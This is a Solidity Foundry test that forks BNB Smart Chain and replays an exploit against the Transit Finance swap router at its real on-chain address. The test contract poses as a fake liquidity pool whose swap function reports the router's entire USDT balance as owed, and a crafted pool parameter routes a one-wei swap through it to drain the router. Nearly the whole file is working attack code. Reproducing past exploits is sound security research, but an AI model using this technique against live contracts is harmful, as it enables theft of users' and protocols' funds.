// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWBNB.sol";

import "./ITransitSwapRouterV5.sol";

ITransitSwapRouterV5 constant router = ITransitSwapRouterV5(
    payable(0x00000047bB99ea4D791bb749D970DE71EE0b1A34)
);
IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

contract TransitFinanceTest is Test {
    function setUp() external {
        vm.createSelectFork("bsc", 34_506_417 - 1);
        deal(address(this), 1);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("Balance BNB before", address(this).balance, 18);
        print("Balance USD of router", USDT.balanceOf(address(router)), 18);

        uint256[] memory pools = new uint256[](2);
        pools[0] = uint256(uint160(address(this)));
        pools[
            1
        ] = 452_312_848_583_266_388_373_324_160_500_822_705_807_063_255_235_247_521_466_952_638_073_588_228_176;
        BaseCore.ExactInputV3SwapParams memory params = BaseCore
            .ExactInputV3SwapParams({
                srcToken: address(0),
                dstToken: address(0),
                dstReceiver: address(this),
                wrappedToken: address(WBNB),
                amount: 1,
                minReturnAmount: 0,
                fee: 0,
                deadline: block.timestamp,
                pools: pools,
                signature: bytes(""),
                channel: ""
            });
        router.exactInputV3Swap{value: 1}(params);

        print("Balance BNB after", address(this).balance, 18);
    }

    function token0() external pure returns (address) {
        return address(WBNB);
    }

    function token1() external pure returns (address) {
        return address(USDT);
    }

    function fee() external pure returns (uint24) {
        return 0;
    }

    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external view returns (int256 amount0, int256 amount1) {
        recipient;
        zeroForOne;
        amountSpecified;
        sqrtPriceLimitX96;
        data;
        return (
            -int256(USDT.balanceOf(address(router))),
            -int256(USDT.balanceOf(address(router)))
        );
    }

    receive() external payable {}
}
